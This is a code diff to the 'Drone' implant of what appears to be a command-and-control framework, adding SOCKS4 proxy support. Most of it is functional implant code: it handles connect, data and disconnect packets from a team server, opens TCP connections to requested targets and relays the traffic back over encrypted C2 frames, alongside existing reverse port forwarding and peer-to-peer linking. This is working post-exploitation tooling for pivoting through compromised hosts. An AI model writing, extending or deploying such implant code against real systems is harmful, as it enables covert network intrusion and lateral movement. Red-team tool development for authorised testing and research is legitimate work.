@@ -29,6 +29,8 @@ public sealed class Drone
     private readonly List<ReversePortForwardState> _revPortForwardStates = new();
     private readonly Dictionary<string, ConcurrentQueue<byte[]>> _revPortForwardQueues = new();
 
+    private readonly Dictionary<string, TcpClient> _socksClients = new();
+
     private readonly Dictionary<string, P2PCommModule> _children = new();
 
     public async Task Run()
@@ -177,7 +179,15 @@ public sealed class Drone
             
             case FrameType.UNLINK:
                 break;
+
+            case FrameType.SOCKS_PROXY:
+            {
+                var packet = Crypto.Decrypt<Socks4Packet>(frame.Data);
+                await HandleSocksPacket(packet);
                 
+                break;
+            }
+            
             default:
                 throw new ArgumentOutOfRangeException();
         }
@@ -328,6 +338,100 @@ public sealed class Drone
         
         // send it outbound
         await SendC2Frame(frame);
+    }
+
+    private async Task HandleSocksPacket(Socks4Packet packet)
+    {
+        switch (packet.Type)
+        {
+            case Socks4Packet.PacketType.CONNECT:
+            {
+                var request = packet.Data.Deserialize<Socks4ConnectRequest>();
+                await HandleSocksConnect(request);
+                
+                break;
+            }
+
+            case Socks4Packet.PacketType.DATA:
+            {
+                await HandleSocksData(packet);
+                break;
+            }
+
+            case Socks4Packet.PacketType.DISCONNECT:
+            {
+                DisconnectSocksClient(packet.Id);
+                break;
+            }
+                
+            default:
+                throw new ArgumentOutOfRangeException();
+        }
+    }
+
+    private async Task HandleSocksConnect(Socks4ConnectRequest request)
+    {
+        IPAddress target;
+
+        if (!string.IsNullOrWhiteSpace(request.DestinationDomain))
+        {
+            var lookup = await Dns.GetHostEntryAsync(request.DestinationDomain);
+            target = lookup.AddressList.FirstOrDefault(a => a.AddressFamily == AddressFamily.InterNetwork);
+        }
+        else
+        {
+            target = new IPAddress(request.DestinationAddress);
+        }
+
+        var client = new TcpClient();
+        await client.ConnectAsync(target, request.DestinationPort);
+
+        if (_socksClients.ContainsKey(request.Id))
+        {
+            _socksClients[request.Id].Dispose();
+            _socksClients.Remove(request.Id);
+        }
+        
+        _socksClients.Add(request.Id, client);
+        
+        // send packet back in acknowledgement
+        var packet = new Socks4Packet(request.Id, Socks4Packet.PacketType.CONNECT);
+        var frame = new C2Frame(_metadata.Id, FrameType.SOCKS_PROXY, Crypto.Encrypt(packet));
+        await SendC2Frame(frame);
+    }
+
+    private async Task HandleSocksData(Socks4Packet inbound)
+    {
+        if (_socksClients.TryGetValue(inbound.Id, out var client))
+        {
+            try
+            {
+                // write data
+                await client.WriteClient(inbound.Data);
+            
+                // read response
+                // this will block if there's no data?
+                var response = await client.ReadClient();
+            
+                // send back to team server
+                var outbound = new Socks4Packet(inbound.Id, Socks4Packet.PacketType.DATA, response);
+                var frame = new C2Frame(_metadata.Id, FrameType.SOCKS_PROXY, Crypto.Encrypt(outbound));
+                await SendC2Frame(frame);
+            }
+            catch
+            {
+                // meh
+            }
+        }
+    }
+
+    private void DisconnectSocksClient(string id)
+    {
+        if (!_socksClients.TryGetValue(id, out var client))
+            return;
+        
+        client.Dispose();
+        _socksClients.Remove(id);
     }
 
     private void HandleReversePortForwardPacket(ReversePortForwardPacket packet)
